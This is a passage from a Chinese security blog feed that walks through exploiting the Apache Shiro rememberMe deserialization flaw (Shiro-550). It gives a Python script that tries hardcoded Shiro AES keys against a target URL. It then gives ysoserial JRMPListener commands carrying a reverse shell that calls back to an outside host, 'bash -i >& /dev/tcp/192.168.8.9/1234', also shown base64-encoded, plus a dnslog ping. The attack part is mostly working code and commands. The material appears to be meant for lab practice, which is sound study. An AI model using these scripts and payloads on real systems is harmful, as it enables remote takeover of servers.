class="title function_">encode_rememberme</span>(<span class="params">target</span>):</span><br><span class="line">    keys = [<span class="string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>, <span class="string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>] 		<span class="comment"># 此处简单列举几个密钥</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">    file_body = base64.b64decode(<span class="string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># CBC加密</span></span><br><span class="line">            encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="number">3</span>,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;good KEY : &quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;good key:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            <span class="comment"># GCM加密</span></span><br><span class="line">            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))</span><br><span class="line">            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="number">1</span>] + encryptedMsg[<span class="number">0</span>] + encryptedMsg[<span class="number">2</span>])</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">3</span>, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;good KEY:&quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;good key:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;good key:&quot;</span> + key)</span><br><span class="line">            <span class="keyword">return</span> key</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="五、Shiro-rememberMe反序列化漏洞（Shiro-550）"><a href="#五、Shiro-rememberMe反序列化漏洞（Shiro-550）" class="headerlink" title="五、Shiro rememberMe反序列化漏洞（Shiro-550）"></a>五、Shiro rememberMe反序列化漏洞（Shiro-550）</h2><h4 id="1、版本1-4-2之前"><a href="#1、版本1-4-2之前" class="headerlink" title="1、版本1.4.2之前"></a>1、版本1.4.2之前</h4><p>该版本漏洞利用<br> 第一步：启动靶机后，访问URL通过burp抓包，判断环境存在shiro，查看返回包中Set-Cookie中是否存在</p>
<p> 第二步：打开公网vps，执行如下命令：（注意这里监听的端口为1099），并执行反弹shell的命令</p>
<p>‍</p>
<p>配置maven</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wget  https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">tar -zxvf apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">sudo <span class="built_in">mv</span> apache-maven-3.6.3 /usr/local/maven3</span><br><span class="line">vim /etc/profile   末尾添加maven环境变量:</span><br><span class="line"><span class="built_in">export</span> M2_HOME=/usr/local/maven3</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$M2_HOME</span>/bin</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>

<p>下载ysoserial并打包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/frohoff/ysoserial.git</span><br><span class="line"><span class="built_in">cd</span> ysoserial</span><br><span class="line">mvn package -D skipTests</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 <span class="string">&quot;反弹 shell 的命令&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里的命令需要使用Java Runtime配置bash编码。<br>在线编码转换地址：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a><br>转换命令如下：<strong>（这里是反弹shell的端口为1234）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.8.9/1234 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjEwMS8xMjM0IDA+JjE=&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第三步：最终在VPS上执行的命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjEwMS8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 <span class="string">&quot;ping e78g5l.dnslog.cn&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20231022170333-j05nxsr.png" alt="image">​</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP__toString%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8/assets/</url>
    <content><![CDATA[<h1 id="assets"><a href="#assets" class="headerlink" title="assets"></a>assets</h1><p>‍</p>
]]></content>
  </entry>
</search>
